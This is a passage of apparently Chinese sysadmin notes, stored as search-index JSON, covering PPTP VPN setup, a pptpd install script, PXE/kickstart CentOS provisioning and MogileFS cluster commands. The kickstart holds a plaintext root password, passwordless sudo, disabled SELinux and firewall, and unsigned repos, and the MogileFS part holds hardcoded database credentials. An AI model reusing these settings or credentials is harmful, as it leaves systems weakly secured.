qtestin-18\n\n\n\n\u5982\u679c\u4f60\u9700\u8981\u5728Linux\u4e2d\u62e8\u5165\u865a\u62df\u7f51\u7edc\u4e2d\uff0c\u90a3\u5c31\u9700\u8981\u5b89\u88c5Linux\u4e0b\u76f8\u5e94VPN\u7684\u5ba2\u6237\u7aef\uff0c\u672c\u6587\u5c06\u4ecb\u7ecd\u4ee5pptp\u65b9\u5f0f\u62e8\u5165\u865a\u62df\u7f51\u7edc\u7684VPN\u7684\u65b9\u6cd5\u3002\n\u3000\u3000\u4ee5\u4e0b\u64cd\u4f5c\u5747\u5728root\u7528\u6237\u4e0b\u64cd\u4f5c\u5b8c\u6210\uff0c\u5e76\u5047\u8bbe\u4f60\u7684Linux\u7cfb\u7edf\u5df2\u7ecf\u5b89\u88c5\u4e86\u7f16\u8bd1\u73af\u5883\u3002\n\u3000\u3000\uff11\u3001\u4e0b\u8f7dpptp\u5ba2\u6237\u7aef\n\u3000\u3000wget http://nchc.dl.sourceforge.net/sourceforge/pptpclient/pptp-1.7.1.tar.gz\n\u3000\u30002\u3001\u89e3\u538b\n\u3000\u3000tar zxvf pptp-1.7.1.tar.gz\n\u3000\u30003\u3001\u7f16\u8bd1\u548c\u5b89\u88c5\n\u3000\u3000make; make install\n\u3000\u30004\u3001\u7f16\u8f91\u914d\u7f6e\u6587\u4ef6\uff0c\u8bbe\u5b9a\u62e8\u53f7\u540d\u4e3amypptp\n\u3000\u3000vim /etc/ppp/peers/mypptp\n\u3000\u3000\u5185\u5bb9\u5982\u4e0b\uff1a\n\n\n\nremotename Tmonitor\nlinkname Tmonitor\nipparam Tmonitor\npty \"pptp 61.147.88.113 --nolaunchpppd \"\nname Tmonitor\nusepeerdns\nrequire-mppe\nrefuse-eap\nnoauth\n\n      \u5176\u4e2d\uff0cmyaccount\u4e3a\u7528\u6237\u540d\n\n\u3000\u30005\u3001\u7f16\u8f91/etc/ppp/chap-secrets\uff0c\u52a0\u5165\u7528\u6237\u540d\u548c\u5e10\u53f7\uff0c\u8fd9\u91cc\u5047\u8bbemyaccount\u7684\u5bc6\u7801\u4e3amypassword\n     myaccount * mypassword *\n\u3000\u30006\u3001\u62e8\u53f7\uff0c\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\n     /usr/sbin/pppd call mypptp logfd 1 updetach\n\u3000\u3000\u5982\u679c\u4ee5\u4e0a\u914d\u7f6e\u6587\u4ef6\u6b63\u786e\u65e0\u8bef\uff0c\u5219\u53ef\u6b63\u5e38\u62e8\u5165\u865a\u62df\u7f51\u7ba1\u7684pptp VPN\u7f51\u7edc\u4e2d\u4e86\uff0c\u6b64\u65f6\u5982\u679c\u7528ifconfig\u67e5\u770b\u8fde\u63a5\u60c5\u51b5\uff0c\u53ef\u4ee5\u770b\u5230\u591a\u4e86\u4e00\u6761ppp\u8fde\u63a5\uff0c\u5e76\u80fd\u6b63\u786e\u5206\u5230IP\u5730\u5740\u4e86\u3002\n\u3000\u3000\uff17\u3001\u6dfb\u52a0\u8def\u7531\n\u3000\u3000\u867d\u7136\u5df2\u7ecf\u62e8\u53f7\u4e0a\u6765\u4e86\uff0c\u4f46\u6b64\u65f6\uff0c\u5982\u679c\u4f60\u8981\u8bbf\u95ee\u4f60\u7684\u865a\u62df\u5c40\u57df\u7f51\u8d44\u6e90\uff0c\u4f60\u5fc5\u9700\u6dfb\u52a0\u4e00\u6761\u8def\u7531\u624d\u884c\uff0c\u8fd9\u91cc\u5047\u8bbe\u4f60\u62e8\u53f7\u4e0a\u6765\u7684\u8fde\u63a5\u540d\u4e3appp0\uff0c\u5e76\u6b64\u4f60\u7684\u865a\u62df\u5c40\u57df\u7f51\u7684IP\u6bb5\u4e3a192.168.163.0\uff0c\u90a3\u4e48\uff0c\u4f60\u9700\u8981\u52a0\u5165\u4ee5\u4e0b\u547d\u4ee4\uff1a \n     route add -net 192.168.163.0 netmask 255.255.255.0 dev ppp0\n\u3000 \u81f3\u6b64\uff0c\u5728Linux\u7cfb\u7edf\u4e0b\u4ee5pptp\u65b9\u5f0f\u62e8\u5165\u865a\u62df\u7f51\u7edc\u7684VPN\u7f51\u7edc\u4e2d\u4e86\u3002\n     PS\uff1a\u5982\u679c\u5728\u62e8\u53f7\u65f6\u62a5\u4ee5\u4e0b\u9519\u8bef\uff1a\n     /usr/sbin/pppd:pty option precludes specifying device name\n     \u8bf7\u68c0\u67e5pppd\u7684\u7248\u672c\uff0c\u4e0d\u53ef\u4f4e\u4e8e2.3.7\u3002\n     \u68c0\u67e5/etc/ppp/optoins\u6587\u4ef6\uff0c\u8be5\u6587\u4ef6\u4e0d\u80fd\u4e3a\u7a7a\u3002\n</code></pre>"},{"location":"daily/33-ppp/#_1","title":"\u4e09\u3001\u811a\u672c","text":"<p><code>pptpd.sh</code></p> <pre><code>yum remove -y pptpd ppp\niptables --flush POSTROUTING --table nat\niptables --flush FORWARD\nrm -rf /etc/pptpd.conf\nrm -rf /etc/ppp\n\narch=`uname -m`\nwget http://www.vr.org/files/pptpd-1.4.0-1.el6.$arch.rpm\n\nyum -y install make libpcap iptables gcc-c++ logrotate tar cpio perl pam tcp_wrappers dkms kernel_ppp_mppe ppp\nrpm -Uvh pptpd-1.4.0-1.el6.$arch.rpm\n\n\nmknod /dev/ppp c 108 0 \necho 1 &gt; /proc/sys/net/ipv4/ip_forward \ncat /etc/rc.local &gt; /etc/rc.local2\necho \"mknod /dev/ppp c 108 0\" &gt; /etc/rc.local\necho \"echo 1 &gt; /proc/sys/net/ipv4/ip_forward\" &gt;&gt; /etc/rc.local\necho \"localip 172.16.36.1\" &gt;&gt; /etc/pptpd.conf\necho \"remoteip 172.16.36.2-254\" &gt;&gt; /etc/pptpd.conf\necho \"ms-dns 8.8.8.8\" &gt;&gt; /etc/ppp/options.pptpd\necho \"ms-dns 8.8.4.4\" &gt;&gt; /etc/ppp/options.pptpd\ncat /etc/rc.local2 &gt;&gt; /etc/rc.local\n\npass=`openssl rand 6 -base64`\nif [ \"$1\" != \"\" ]\nthen pass=$1\nfi\n\necho \"vpn pptpd ${pass} *\" &gt;&gt; /etc/ppp/chap-secrets\n\niptables -F\niptables -t nat -A POSTROUTING -s 172.16.36.0/24 -j SNAT --to-source `ifconfig  | grep 'inet addr:'| grep -v '127.0.0.1' | cut -d: -f2 | awk 'NR==1 { print $1}'`\niptables -A FORWARD -p tcp --syn -s 172.16.36.0/24 -j TCPMSS --set-mss 1356\nservice iptables save\n\nchkconfig iptables on\nchkconfig pptpd on\n\nservice iptables start\nservice pptpd start\n\necho \"VPN service is installed, your VPN username is vpn, VPN password is ${pass}\"\n</code></pre>"},{"location":"daily/34-kickstart/","title":"kickstart","text":"<pre><code>pxe\n\n1,\u4f9d\u8d56\u5e93\u5b89\u88c5 \nyum install -y dhcp.x86_64 dhcp-devel.x86_64 dhcp-common.x86_64 nginx.x86_64 tftp-server.x86_64 xinetd.x86_64 syslinux.x86_64 rsync.x86_64 vim.x86_64\n\n2,FTP\u914d\u7f6e\nvim /etc/xinetd.d/tftp\nservice tftp\n{\n        socket_type             = dgram\n        protocol                = udp\n        wait                    = yes\n        user                    = root\n        server                  = /usr/sbin/in.tftpd\n        server_args             = -s /data/tftp\n        disable                 = no\n        per_source              = 11\n        cps                     = 100 2\n        flags                   = IPv4\n}\n\n3,Nginx\u914d\u7f6e\nvim /etc/nginx/nginx.conf\n    server{\n        listen 80;\n        root /data/iso/pxe;\n        autoindex on;\n    }\n\n4,DHCP\u914d\u7f6e\nvim /etc/dhcp/dhcpd.conf\nddns-update-style interim;\nignore client-updates;\n\nsubnet 192.168.100.0 netmask 255.255.255.0 {\n    option routers 192.168.100.1;\n    option subnet-mask 255.255.255.0;\n    option domain-name-servers 192.168.100.1;\n\n    range dynamic-bootp 192.168.100.200 192.168.100.250;\n    default-lease-time 21600;\n    max-lease-time 43200;\n    next-server 192.168.100.31;\n    filename \"pxelinux.0\";\n\n}\n\n5,\u5149\u76d8\u6302\u8f7d\uff0c\u955c\u50cf\u62f7\u8d1d\n\u6302\u8f7d CentOS-6.4-x86_64-minimal.iso \n\nmkdir -p /data/cdrom /data/iso/pxe /data/tftp/pxelinux.cfg/\nmount -o loop /dev/cdrom /data/cdrom\nrsync -av /data/cdrom/ /data/iso/pxe/\n/bin/cp /usr/share/syslinux/pxelinux.0 /data/tftp/\n/bin/cp /data/iso/pxe/isolinux/isolinux.cfg /data/tftp/pxelinux.cfg/default\n/bin/cp /data/iso/pxe/isolinux/* /data/tftp/\n\n\u5378\u8f7d CentOS-6.4-x86_64-minimal.iso\n\n6,\u914d\u7f6e pxe\n\nTT=(date +%Y%m%d.%H%M%S)\nfor i in {1..100};do\n    echo \"-------- Author: jesse. for CentOS 6.4 x86_64 V{TT} by PXE  --------\"\ndone &gt; /data/iso/pxe/isolinux/boot.msg\n/bin/cp /data/iso/pxe/isolinux/boot.msg /data/tftp/boot.msg\n\nchmod +w /data/tftp/pxelinux.cfg/default\nvim /data/tftp/pxelinux.cfg/default\n\ndefault linux initrd=initrd.img ks=http://192.168.100.35/ks.cfg\n\ndefault vesamenu.c32\n\nprompt 1\n\ntimeout 30\n\ndisplay boot.msg\n\nmenu background splash.jpg\nmenu title Welcome to CentOS 6.4 by jesse!\nmenu color border 0 #ffffffff #00000000\nmenu color sel 7 #ffffffff #ff000000\nmenu color title 0 #ffffffff #00000000\nmenu color tabmsg 0 #ffffffff #00000000\nmenu color unsel 0 #ffffffff #00000000\nmenu color hotsel 0 #ff000000 #ffffffff\nmenu color hotkey 7 #ffffffff #ff000000\nmenu color scrollbar 0 #ffffffff #00000000\n\nlabel linux\n  menu label ^Install or upgrade an existing system\n  menu default\n  kernel vmlinuz\n  append initrd=initrd.img\nlabel vesa\n  menu label Install system with ^basic video driver\n  kernel vmlinuz\n  append initrd=initrd.img xdriver=vesa nomodeset\nlabel rescue\n  menu label ^Rescue installed system\n  kernel vmlinuz\n  append initrd=initrd.img rescue\nlabel local\n  menu label Boot from ^local drive\n  localboot 0xffff\nlabel memtest86\n  menu label ^Memory test\n  kernel memtest\n  append -\n\ncopying ...\n/bin/cp binutils-* cmake-2.6.4-5.el6.x86_64.rpm curl-7.19.7-35.el6.x86_64.rpm lrzsz-0.12.20-27.1.el6.x86_64.rpm make-3.81-20.el6.x86_64.rpm nc-1.84-22.el6.x86_64.rpm net-snmp-* openssh-clients-5.3p1-84.1.el6.x86_64.rpm rsync-3.0.6-9.el6.x86_64.rpm sysstat-9.0.4-20.el6.x86_64.rpm tree-1.5.3-2.el6.x86_64.rpm vim-common-7.2.411-1.8.el6.x86_64.rpm vim-minimal-7.2.411-1.8.el6.x86_64.rpm wget-1.12-1.8.el6.x86_64.rpm /data/iso/Packages\n\nvim /data/iso/pxe/ks.cfg\ninstall\nurl --url=http://192.168.100.31/\ncdrom\nlang en_US.UTF-8\nkeyboard us\n\nnetwork --onboot yes --device eth0 --bootproto dhcp\n\nrootpw qwert54321\n\nfirewall --enabled --port=50022:tcp\n\nfirewall --disabled\nauthconfig --enableshadow --passalgo=\"author jesse\"\nselinux --disabled\ntimezone --utc Asia/Shanghai \nbootloader --location=mbr --driveorder=sda --append=\"crashkernel=auto rhgb quiet\" \nzerombr\nclearpart --all --initlabel\npart swap --size=4096\npart /boot --fstype=ext4 --size=512\n\npart / --fstype=ext4 --size=15240\n\npart /data --fstype=ext4 --grow --size=1\n\npart / --fstype=ext4 --grow --size=1\nreboot\n%packages --nobase \n@core\n\n%end\n\n%post --log=/root/ks.post.log\n\nuser manage\n\ngroupadd sshuser\nuseradd -G sshuser jesse\nuseradd -G sshuser ericdu\nuseradd -G sshuser balaamwe\necho \"xx\"|passwd jesse --stdin\nsed -i '/--dport 22/a-A INPUT -m state --state NEW -m tcp -p tcp --dport 50022 -j ACCEPT' /etc/sysconfig/iptables\nsed -i '/^root/a\\jesse    ALL=NOPASSWD:       ALL' /etc/sudoers\nsed -i '/^root/a\\ericdu    ALL=(ALL)       ALL' /etc/sudoers\nsed -i '/^root/a\\balaamwe    ALL=(ALL)       ALL' /etc/sudoers\n\nother \n\necho \"30 5 * * * /usr/sbin/ntpdate ntp.uplus.youja.cn\" | crontab -\n\nseed -i '1 a\\nameserver 10.10.10.82' /etc/resolv.conf\n\nsed -i '1 a\\nameserver 10.10.10.83' /etc/resolv.conf\n\necho \"30 5 * * * /usr/sbin/ntpdate cn.pool.ntp.org\" | crontab -\nsed -i '1 a\\nameserver 192.168.100.1' /etc/resolv.conf\n\ninit env &amp; tool\n\ncat &gt; /root/init.install.sh &lt;&lt; EOF\n\n! /bin/bash\n\nyum install -y wget curl\nmv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup\ncurl -s -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.163.com/.help/CentOS6-Base-163.repo\nyum makecache\nyum install -y  binutils cmake curl lrzsz make nc net-snmp net-snmp-utils nmap ntpdate openssh-clients rsync sysstat tree vim wget\nmkdir -p /backup\nmv /root/* /backup/\nEOF\nchmod +x /root/init.install.sh\n\nulimit sets\n\ncat &gt; /etc/security/limits.conf &lt;&lt; EOF\n\n- soft nofile 65536\n- hard nofile 65536\n- hard nproc 4096\n- soft nproc 4096\nEOF\ncat &gt; /etc/security/limits.d/90-nproc.conf &lt;&lt; EOF\n- soft    nproc     4096\nEOF\n\nclose system service\n\nchkconfig iptables off\nchkconfig ip6tables off\nchkconfig postfix off\nchkconfig rpcbind off\n\nclose tty\n\nsed '23s/6/2/g' -i /etc/sysconfig/init\n\ntcp for kernel\n\ncat &gt; /etc/sysctl.conf &lt;&lt; EOF\nnet.ipv4.ip_forward = 0\nnet.ipv4.tcp_syncookies = 1\nkernel.shmmni = 10240\nkernel.sem = 250 32000 100 128\nnet.ipv4.conf.default.rp_filter = 1\nnet.ipv4.conf.default.accept_source_route = 0\nkernel.sysrq = 0\nfs.file-max = 1213051\nkernel.core_uses_pid = 1\nnet.ipv4.tcp_syncookies = 1\nkernel.msgmnb = 65536\nkernel.msgmax = 65536\nkernel.shmmax = 68719476736\nkernel.shmall = 4294967296\nnet.core.somaxconn = 65535\nnet.ipv4.tcp_max_syn_backlog = 262144\nnet.ipv4.tcp_synack_retries = 3\nnet.ipv4.tcp_keepalive_intvl = 30\nnet.ipv4.tcp_keepalive_probes = 3\nnet.ipv4.tcp_syn_retries = 3\nnet.ipv4.tcp_keepalive_time = 10\nnet.ipv4.tcp_fin_timeout = 10\nnet.ipv4.tcp_tw_reuse = 1\nnet.ipv4.tcp_tw_recycle = 1\nnet.ipv4.ip_local_port_range = 1024 65535\nnet.ipv4.tcp_max_tw_buckets = 1024\n\nnet.netfilter.nf_conntrack_tcp_timeout_established = 60\nnet.netfilter.nf_conntrack_max = 655350\nnet.nf_conntrack_max = 655350\n\nEOF\n\nset server hostname\n\nsed '2s/^.*/HOSTNAME=youja.cn/g' -i /etc/sysconfig/network\n\nset group timetout\n\nsed '11s/5/2/g' -i /etc/grub.conf\n\nset history for profile\n\nsed '48s/1000/100/g' -i /etc/profile\n\nlogin info\n\ncat &gt;&gt; /etc/pam.d/login &lt;&lt; EOF\nsession required /lib64/security/pam_limits.so\nsession required pam_limits.so\nEOF\ncat &gt; /etc/issue &lt;&lt; EOF\nWelcome to www.youja.cn.\nCentOS 6.4 x86_64 (Final)\nEOF\n/bin/cp /etc/issue /etc/issue.net\n\nset sshd_config\n\necho \"AllowGroups sshuser\" &gt;&gt; /etc/ssh/sshd_config\nsed -i '/#PermitRootLogin yes/a\\PermitRootLogin no' /etc/ssh/sshd_config\nsed -i '/#Port 22/a\\Port 50022' /etc/ssh/sshd_config\ncat &gt;&gt; /etc/ssh/sshd_config &lt;&lt; EOF\nPermitEmptyPasswords no\nUseDNS no\nBanner /etc/issue\nEOF\n\nconfigure yum repo\n\nnginx for yum\n\ncat &gt; /etc/yum.repos.d/nginx.repo &lt;&lt; EOF\n[nginx]\nname=nginx repo\n\nbaseurl=http://nginx.org/packages/centos/6/$basearch/\n\nbaseurl=http://nginx.org/packages/centos/6/x86_64/\ngpgcheck=0\nenabled=1\nEOF\n\nvarnish for yum\n\ncat &gt; /etc/yum.repos.d/varnish.repo &lt;&lt; EOF\n[varnish-3.0]\nname=Varnish 3.0 for Enterprise Linux 5 - $basearch\n\nbaseurl=http://repo.varnish-cache.org/redhat/varnish-3.0/el5/$basearch\n\nbaseurl=http://repo.varnish-cache.org/redhat/varnish-4.0/el6/x86_64/\ngpgcheck=0\nenabled=1\n\ngpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-VARNISH\n\nEOF\n\nuser ssh key\n\nmkdir -p /home/jesse/.ssh\ncat &gt; /home/jesse/.ssh/authorized_keys &lt;&lt; EOF\nssh-dss AAAAB3NzaC1kc3MAAACBALN+zutgLhYyLEgmNnW9DbaVnPCLlq3dMv1gCk80lm7ufcUzNp9zvR3OrCECAq3s1w9vVPqWMfg21LkAAF/e/eTgBYI+aF4s+4z+Cn4eiXTyM0mRyuQ0YxWqs3GJLBjqcLVdOpWGy5F3X/9sAe9lG+SbbErSy68YxmYv7U40ha/9AAAAFQDtw6YYdKinAPj6hu6S3Islyb3ZdQAAAIAIIFtUk2V4ASA2QgE2OGLVM/QMeRYaRVdP/OHF4Ri2kvR0B3s5P1C652PKnc97bwb0BTHqDhTJoqfSKiHLHLBdfQXdLY1LLh/hiBdPasMrUMiSEhiy+pvjNqwW1BqL6b4hBpvooVkdHTk/6pKTYQwVhJ2oN8+0FzUk6GC+VseM8AAAAIEAg8LYT2iAv0hicgHFo3qmqv/MFvJQISlRWm0TxRBa3FFp6EH4MuaRzzVekur79h+oDOf/41QZ+j9M2oh5RdePUDGOQ6S3WBcppQOYc5vzF37wPv2Z1p1lD8vRSu2yNMxPjkMvlRu1+plYjjLyQvicyJbX7jN+DDl/iDp1pKYY5vg=\nssh-dss AAAAB3NzaC1kc3MAAACBANyhLAY0OZcXuP/zoSzb2wHp8yEd7C5bjLw794bPNHKJeYX8Whz0plqUirP9rKxiXGm1B2Nwnpf9wNmso/EFquMA2kVjAT56i7tvPNj5V/PmkUT5FIhApoFqw9pZ90vHPDyB8u/u4oNNO0N9sschVEJa592boH4u28rSvd78sAlfAAAAFQCH+kjWbyk1bm2RhroMkPx/zsQaWwAAAIAzFvXSzBWrm92V322txFVRwLU2ahz7V9H6Ff6OQEpdL0bylMQj6MD6d+v5P1H1fuPgCDtBB87XRGnvV4IonMocr2/Qm/YwUOnRZOLbg05/5wVZiJQkLsErnDgeFGat+Ib97P5ytLvZXPf1m/tW6FoxplZq5GjvQAQ2A7Cw/voQjwAAAIASoJ05CkDWzgfg4eBonFPEtJbF8eGIEqH6y1e09NmBlw6S4khGfU3thg5OPQYfRLdOCg/4rnrc31T2TUnZaoL+W+nJe6+4uAiMFBTszpVlvQ1JD8yNPgIVZJD8/BMXE0eGLu+OVvMHlqTGIev8dUO+Iv3a3wBPuA8ReiI9ZTK+cw==\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDV5RZ2Cmd3rk01XgbMzubxQYFVcFznSnzadcB1dhDaw7MiC3DRLGU5YLgsZmZdZQxrGSVEXmXwEKrD9oxcwL31DnWJdjzsnJrHXv/6LXKh03OlQ7Di4UoNLxpFHZecX2o23fYuTdFBojL8sSeI9jucVAAskMFW0rJHcKiv1/f/CJnUIH604Z6xeHK7tfqJUJ+bxuLuhFgbMymHkbqNI2UU0L4LHBg8IvPIROA86xbSmgINZ/ccbhy7ZEhGOODLCY4K3AlVaWQqMrhjjOA003TBtYbrKGFWpG+KFdTVAbZjVawGbnWtSN03qYQPYmbSY5e1sH/oTyfzwWVeFI1d8tbv\nEOF\nchmod 700 -R /home/jesse/.ssh\nchown jesse.jesse -R /home/jesse/.ssh\n\n%end\n\n\u542f\u52a8\u670d\u52a1\n/etc/init.d/dhcpd restart\n/etc/init.d/nginx restart\n/etc/init.d/xinetd restart\n\nchkconfig dhcpd on\nchkconfig nginx on\nchkconfig xinetd on\n\nmk\n\n1,\u51c6\u5907\u73af\u5883\nyum install -y anaconda.x86_64 createrepo.noarch mkisofs.x86_64\nmkdir /data/iso/mk\nrsync -av /data/iso/pxe/ /data/iso/mk/\n\n2,\u4fee\u6539\u914d\u7f6e\nvim /data/iso/mk/isolinux/ks.cfg\n\ncopy vim /data/iso/pxe/ks.cfg\nmodify #url --url=http://192.168.100.31/\n\nvim /data/iso/mk/isolinux/isolinux.cfg\n\ncopy /data/tftp/pxelinux.cfg/default\nmodify default linux ks=cdrom:/isolinux/ks.cfg initrd=initrd.img\n\n3,\u751f\u6210\u955c\u50cf\n/bin/rm -f /data/iso/mk/repodata/*\n/bin/cp /data/iso/pxe/repodata/*-minimal-x86_64.xml  /data/iso/mk/repodata/minimal-x86_64.xml\ncreaterepo -g /data/iso/mk/repodata/minimal-x86_64.xml /data/iso/mk/\ncd /data/iso/mk\nmkisofs -o /tmp/Auto-CentOS-6.4-x86_64-$(date +%s).iso -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -R -J -v -T /data/iso/mk/\n\n/usr/bin/implantisomd5 /tmp/*.iso \n\nvim /etc/nginx/nginx.conf\n\n    server{\n        listen 80;\n        root /data/iso/pxe;\n        autoindex on;\n\n        location /download {\n            alias /tmp;\n            autoindex on;\n        }\n    }\n\nnginx -t\nnginx -s reload\n</code></pre>"},{"location":"daily/35-mogilefs/","title":"mogilefs","text":"<pre><code>\u53c2\u8003\u7248\u672c\u53f7 ~ 2015-05-12\n\nmysql 5.5.24\nperl 5.10.1\nMogileFS:Server 2.66\nMogileFS:Utils 2.26\nMogileFS:Client 1.17\nSys:Syscall 0.23\nCache::Memcached 1.30\nTime::HiRes 1.9721\n\u2026\u2026\nnginx 1.2.9\nnginx-mogilefs-module 1.0.4\nnginx-requestkey-module 1.0\n\npcre 8.33\n\nyum install -q -y gcc.x86_64 gcc-c++.x86_64 gcc.x86_64 make.x86_64 binutils.x86_64 patch.x86_64 mysql-devel.x86_64 perl-CPAN.x86_64 git.x86_64 tree.x86_64 vim.x86_64 perl-YAML.noarch libyaml-devel.x86_64 \n\nperl -MCPAN -e shell\n\nversion 2.66            1.17            2.26           1.61          4.32    1.9022       1.80    1.633 4.031     0.70 1.2907        1.30             1.9721\n\ninstall  MogileFS::Server MogileFS::Client MogileFS::Utils Danga::Socket IO::AIO Net::Netmask Perlbal DBI   DBD:mysql YAML BSD::Resource Cache::Memcached Time::HiRes\n\nm MogileFS::Server\nm MogileFS::Utils\nm MogileFS::Client\nm Sys::Syscall\nm Cache::Memcached\nm Time::HiRes\nforce install D/DO/DORMANDO/MogileFS-Server-2.66.tar.gz\nforce install D/DO/DORMANDO/MogileFS-Utils-2.26.tar.gz\nforce install B/BR/BRADFITZ/Sys-Syscall-0.23.tar.gz # \u7248\u672c\u517c\u5bb9\u6027\u5f02\u5e38\n\n---\n\nmogdbsetup --dbhost=10.10.10.167 --dbname=mogilefs_7101 --dbuser=mogilefs --dbpassword=mogilefs --yes\n\nmkdir -p /etc/mogilefs\nvim /etc/mogilefs/mogilefsd_7101.conf\ndb_dsn = DBI:mysql:mogilefs_7101:host=10.10.10.167;port=3306;mysql_connect_timeout=5\ndb_user = mogilefs\ndb_pass = mogilefs\nconf_port = 7101\nlistener_jobs = 5\nnode_timeout = 5\nquery_jobs = 30\nreplicate_jobs = 10\nrebalance_ignore_missing = 1\n\nuseradd mogilefs -s /bin/sh -M --uid=600\n/bin/su mogilefs -c \"/usr/local/bin/mogilefsd -c /etc/mogilefs/mogilefsd_7101.conf --daemon\"\n\nvim /etc/mogilefs/mogstored.conf\nhttplisten=0.0.0.0:7500\nmgmtlisten=0.0.0.0:7501\ndocroot=/storage\nmaxconns=10000\n\n/usr/local/bin/mogstored --daemon\n\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7101 settings set memcache_servers 10.10.10.174:11221\n\nadd host &amp; device\n\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7101 host add host_101 --ip=10.10.10.130 --port=7500 --status=alive\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7101 host add host_102 --ip=10.10.10.131 --port=7500 --status=alive\n\n\u6709\u4e09\u4e2aserver\u7aef\u53e3\n\nmogadm --trackers=10.10.10.130:7101 host add host_101 --ip=10.10.10.130 --port=7500 --status=alive\nmogadm --trackers=10.10.10.130:7102 host add host_101 --ip=10.10.10.130 --port=7500 --status=alive\nmogadm --trackers=10.10.10.130:7103 host add host_101 --ip=10.10.10.130 --port=7500 --status=alive\n\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7101 host list\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7102 host list\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7103 host list\n\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7101 device add host_101 101\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7101 device add host_101 102\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7101 device add host_101 103\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7101 device add host_101 104\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7101 device add host_101 105\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7101 device add host_101 106\n\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7101 device list\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7102 device list\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7103 device list\n\n---\n\nmogadm --trackers=10.10.10.130:7101 host add host_102 --ip=10.10.10.131 --port=7500 --status=alive\nmogadm --trackers=10.10.10.130:7102 host add host_102 --ip=10.10.10.131 --port=7500 --status=alive\nmogadm --trackers=10.10.10.130:7103 host add host_102 --ip=10.10.10.131 --port=7500 --status=alive\n\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7101 device add host_102 201\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7101 device add host_102 202\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7101 device add host_102 203\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7101 device add host_102 204\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7101 device add host_102 205\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7101 device add host_102 206\n\n\u5f53\u8ffd\u52a0\u5b58\u50a8\u673a\u5668\u65f6\uff0c\u6709\u4e09\u4e2aserver\u7aef\u53e3\n\nmogadm --trackers=10.10.10.130:7101 host add host_104 --ip=10.10.10.133 --port=7500 --status=alive\nmogadm --trackers=10.10.10.130:7102 host add host_104 --ip=10.10.10.133 --port=7500 --status=alive\nmogadm --trackers=10.10.10.130:7103 host add host_104 --ip=10.10.10.133 --port=7500 --status=alive\n\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7101 host list\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7102 host list\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7103 host list\n\nmogadm --trackers=10.10.10.130:7101 device add host_104 401\nmogadm --trackers=10.10.10.130:7101 device add host_104 402\nmogadm --trackers=10.10.10.130:7101 device add host_104 403\nmogadm --trackers=10.10.10.130:7101 device add host_104 404\nmogadm --trackers=10.10.10.130:7101 device add host_104 405\nmogadm --trackers=10.10.10.130:7101 device add host_104 406\n\nmogadm --trackers=10.10.10.130:7102 device add host_104 401\nmogadm --trackers=10.10.10.130:7102 device add host_104 402\nmogadm --trackers=10.10.10.130:7102 device add host_104 403\nmogadm --trackers=10.10.10.130:7102 device add host_104 404\nmogadm --trackers=10.10.10.130:7102 device add host_104 405\nmogadm --trackers=10.10.10.130:7102 device add host_104 406\n\nmogadm --trackers=10.10.10.130:7103 device add host_104 401\nmogadm --trackers=10.10.10.130:7103 device add host_104 402\nmogadm --trackers=10.10.10.130:7103 device add host_104 403\nmogadm --trackers=10.10.10.130:7103 device add host_104 404\nmogadm --trackers=10.10.10.130:7103 device add host_104 405\nmogadm --trackers=10.10.10.130:7103 device add host_104 406\n\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7101 device list\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7102 device list\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7103 device list\n\n\u8ba9\u6700\u8fd1\u7684\u6587\u4ef6\u5199\u8fdb\u65b0\u8ffd\u52a0\u7684\u78c1\u76d8device with 7102\uff08\u5f53\u524d\u5728\u75287002\uff09\n\nmogadm --trackers=10.10.10.130:7102 device mark host_101 101 drain\n\nmogadm --trackers=10.10.10.130:7102 device mark host_101 101 drain\nmogadm --trackers=10.10.10.130:7102 device mark host_101 102 drain\nmogadm --trackers=10.10.10.130:7102 device mark host_101 103 drain\nmogadm --trackers=10.10.10.130:7102 device mark host_101 104 drain\nmogadm --trackers=10.10.10.130:7102 device mark host_101 105 drain\nmogadm --trackers=10.10.10.130:7102 device mark host_101 106 drain\n\nmogadm --trackers=10.10.10.130:7102 device mark host_102 201 drain\nmogadm --trackers=10.10.10.130:7102 device mark host_102 202 drain\nmogadm --trackers=10.10.10.130:7102 device mark host_102 203 drain\nmogadm --trackers=10.10.10.130:7102 device mark host_102 204 drain\nmogadm --trackers=10.10.10.130:7102 device mark host_102 205 drain\nmogadm --trackers=10.10.10.130:7102 device mark host_102 206 drain\n\nmogadm --trackers=10.10.10.130:7102 device check\n\n\u4e00\u5b9a\u65f6\u95f4\u540e\u5f97\u89e3\u9501\u56de\u6765 \n\nmogadm --trackers=10.10.10.130:7102 device modify host_101 101 --status=alive --weight=10\n\nmogadm --trackers=10.10.10.130:7102,10.10.10.131:7102 check\nmogadm --trackers=10.10.10.130:7102,10.10.10.131:7102 device list\n\n===============================================================================\nmogadm --trackers=10.10.10.130:7101,10.10.10.131:7101 domain add 